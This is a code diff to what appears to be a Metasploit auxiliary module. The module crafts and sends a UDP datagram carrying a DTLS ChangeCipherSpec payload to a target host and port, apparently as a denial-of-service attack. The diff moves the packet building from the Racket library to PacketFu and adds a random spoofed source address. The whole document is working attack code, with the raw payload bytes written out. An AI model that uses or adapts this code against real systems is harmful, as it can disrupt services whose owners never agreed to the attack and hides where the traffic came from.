@@ -11,7 +11,6 @@
 
 
 require 'msf/core'
-require 'racket'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -43,24 +42,16 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		print_status("Creating DTLS ChangeCipherSpec Datagram...")
 		open_pcap
-		n = Racket::Racket.new
-
-		n.layers[3] = Racket::L3::IPv4.new
-		n.layers[3].dst_ip = datastore['RHOST']
-		n.layers[3].version = 4
-		n.layers[3].hlen = 0x5 #
-		n.layers[3].ttl = 44
-		n.layers[3].protocol = 0x11
-
-		n.layers[4] = Racket::L4::UDP.new
-		n.layers[4].src_port = 34060
-		n.layers[4].dst_port = Integer(datastore['RPORT'])
-		n.layers[4].payload = "\x14\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01"
-		n.layers[4].fix!(n.layers[3].src_ip, n.layers[3].dst_ip)
-
-		buff = n.pack
+		p = PacketFu::UDPPacket.new
+		p.ip_daddr = datastore['RHOST']
+		p.ip_src = rand(0x100000000)
+		p.ip_ttl = 44
+		p.udp_sport = 34060
+		p.udp_dport = datastore['RPORT'].to_i
+		p.payload = "\x14\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01"
+		p.recalc
 		print_status("Sending Datagram to target...")
-		capture_sendto(buff, '255.255.255.255')
+		capture_sendto(p, '255.255.255.255')
 		close_pcap
 	end
 end
